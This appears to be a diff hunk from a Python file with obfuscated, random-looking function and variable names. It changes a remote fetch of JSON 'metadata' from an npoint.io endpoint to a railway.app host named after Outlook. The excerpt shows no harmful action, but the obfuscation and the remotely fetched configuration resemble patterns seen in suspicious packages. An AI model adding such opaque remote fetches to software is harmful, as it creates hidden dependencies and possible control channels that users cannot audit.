@@ -18,7 +18,7 @@ def model_ecgxei_603():
 
     def eval_cresra_428():
         try:
-            process_vxdgad_390 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_vxdgad_390 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_vxdgad_390.raise_for_status()
             learn_dhgzus_606 = process_vxdgad_390.json()
             learn_iilwwu_763 = learn_dhgzus_606.get('metadata')
